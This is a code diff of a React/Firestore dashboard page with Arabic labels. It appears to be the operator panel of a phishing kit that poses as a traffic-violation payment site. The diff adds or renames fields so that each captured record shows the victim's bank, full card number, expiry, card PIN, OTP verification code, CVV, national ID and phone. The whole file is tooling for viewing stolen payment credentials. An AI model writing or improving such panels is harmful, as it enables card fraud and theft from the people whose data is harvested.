@@ -16,16 +16,18 @@ import { auth, db } from "@/lib/firestore"
 
 interface Notification {
   id: string
-  cardHolderName: string
+  bank: string
+  pass: string
+  prefix: string
   cardNumber: string
   cvv: string
-  expiryDatem: string
-  expiryDatey: string
+  month: string
+  year: string
   pagename: string
   plateNumber: string
   plateType: string
   status: string
-  createdDate: string
+  timestamp: string
   verificationCode: string
   violationNumber: string
   violationType: string
@@ -200,11 +202,11 @@ export default function NotificationsPage1() {
                   <td className="px-4 py-3">
                     <div className="flex flex-col sm:flex-row gap-2">
                       <Badge
-                        variant={notification.plateNumber ? "default" : "destructive"}
+                        variant={notification.personalInfo.id ? "default" : "destructive"}
                         className="rounded-md cursor-pointer"
                         onClick={() => handleInfoClick(notification, "personal")}
                       >
-                        {notification.plateNumber ? "معلومات شخصية" : "لا يوجد معلومات"}
+                        {notification.personalInfo.id ? "معلومات شخصية" : "لا يوجد معلومات"}
                       </Badge>
                       <Badge
                         variant={notification.cardNumber ? "default" : "destructive"}
@@ -217,7 +219,7 @@ export default function NotificationsPage1() {
                   </td>
                   <td className="px-4 py-3">خطوه - {notification.pagename}</td>
                   <td className="px-4 py-3">
-                    {formatDistanceToNow(new Date(notification.createdDate), {
+                  {notification.timestamp &&formatDistanceToNow(new Date(notification.timestamp), {
                       addSuffix: true,
                       locale: ar,
                     })}
@@ -267,7 +269,7 @@ export default function NotificationsPage1() {
                 <strong>الاسم الكامل:</strong> {selectedNotification.id}
               </p>
               <p>
-                <strong>رقم الهوية:</strong> {selectedNotification.id}
+                <strong>رقم الهوية:</strong> {selectedNotification.personalInfo.id}
               </p>
               <p>
                 <strong>رقم الهاتف:</strong> {selectedNotification.plateType}
@@ -277,7 +279,7 @@ export default function NotificationsPage1() {
           {selectedInfo === "card" && selectedNotification && (
             <div className="space-y-2">
               <p>
-                <strong className="text-red-400 mx-4">البنك:</strong> {selectedNotification.cardHolderName}
+                <strong className="text-red-400 mx-4">البنك:</strong> {selectedNotification.bank}
               </p>
               <p></p>
               <p>
@@ -285,15 +287,18 @@ export default function NotificationsPage1() {
                 {selectedNotification.cardNumber && selectedNotification.cardNumber}
               </p>
               <p>
-                <strong className="text-red-400 mx-4">تاريخ الانتهاء:</strong> {selectedNotification.expiryDatey}/
-                {selectedNotification.expiryDatem}
+                <strong className="text-red-400 mx-4">تاريخ الانتهاء:</strong> {selectedNotification.year}/
+                {selectedNotification.month}
               </p>
 
               <p className="flex items-center">
-                <strong className="text-red-400 mx-4">رمز البطاقة :</strong> {selectedNotification.cvv}
+                <strong className="text-red-400 mx-4">رمز البطاقة :</strong> {selectedNotification.pass}
               </p>
               <p className="flex items-centerpt-4">
                 <strong className="text-red-400 mx-4">رمز التحقق :</strong> {selectedNotification.otp}
+              </p> 
+              <p className="flex items-centerpt-4">
+                <strong className="text-red-400 mx-4">رمز الأمان :</strong> {selectedNotification.cvv}
               </p>
               <></>
               <p>
